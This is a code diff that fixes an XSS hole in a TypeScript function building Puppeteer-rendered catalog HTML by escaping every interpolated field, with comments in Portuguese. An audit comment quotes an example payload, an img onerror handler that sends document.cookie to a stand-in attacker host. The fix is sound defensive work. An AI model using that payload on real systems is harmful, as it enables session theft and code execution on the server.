@@ -11,29 +11,53 @@ interface PdfTemplateInput {
   tenantName: string
 }
 
+// Achado em auditoria de segurança: todo campo abaixo era interpolado direto
+// na HTML renderizada pelo Puppeteer sem escapar nada — clientName em
+// particular é texto livre de qualquer usuário autenticado (não só admin) no
+// corpo de POST /pdf/generate. Um clientName como
+// `<img src=x onerror="fetch('http://attacker/?c='+document.cookie)">`
+// executava dentro da página do Puppeteer no server. Escapa entidades HTML
+// em todo valor de texto e aspas em todo valor usado como atributo.
+function escapeHtml(value: string): string {
+  return value
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;')
+}
+
 export function buildCatalogHtml(input: PdfTemplateInput): string {
   const date = new Date().toLocaleDateString('pt-BR')
 
   const cards = input.variants
-    .map(
-      (v) => `
+    .map((v) => {
+      const skuVariant = escapeHtml(v.skuVariant)
+      const colorLabel = v.colorLabel ? escapeHtml(v.colorLabel) : null
+      const productName = escapeHtml(v.productName)
+      const imageUrl = v.imageUrl ? escapeHtml(v.imageUrl) : null
+
+      return `
       <div class="card">
         <div class="card-img">
           ${
-            v.imageUrl
-              ? `<img src="${v.imageUrl}" alt="${v.skuVariant}" />`
+            imageUrl
+              ? `<img src="${imageUrl}" alt="${skuVariant}" />`
               : `<div class="no-img">Sem imagem</div>`
           }
         </div>
         <div class="card-info">
-          <p class="sku">${v.skuVariant}</p>
-          ${v.colorLabel ? `<p class="color">${v.colorLabel}</p>` : ''}
-          <p class="name">${v.productName}</p>
+          <p class="sku">${skuVariant}</p>
+          ${colorLabel ? `<p class="color">${colorLabel}</p>` : ''}
+          <p class="name">${productName}</p>
         </div>
       </div>
-    `,
-    )
+    `
+    })
     .join('')
+
+  const tenantName = escapeHtml(input.tenantName)
+  const clientName = input.clientName ? escapeHtml(input.clientName) : undefined
 
   return `<!DOCTYPE html>
 <html lang="pt-BR">
@@ -103,14 +127,14 @@ export function buildCatalogHtml(input: PdfTemplateInput): string {
 </head>
 <body>
   <div class="header">
-    <h1>${input.tenantName}</h1>
-    <p>Catálogo personalizado${input.clientName ? ` — ${input.clientName}` : ''} | ${date}</p>
+    <h1>${tenantName}</h1>
+    <p>Catálogo personalizado${clientName ? ` — ${clientName}` : ''} | ${date}</p>
   </div>
   <div class="grid">
     ${cards}
   </div>
   <div class="footer">
-    Gerado em ${date} | ${input.tenantName}
+    Gerado em ${date} | ${tenantName}
   </div>
 </body>
 </html>`
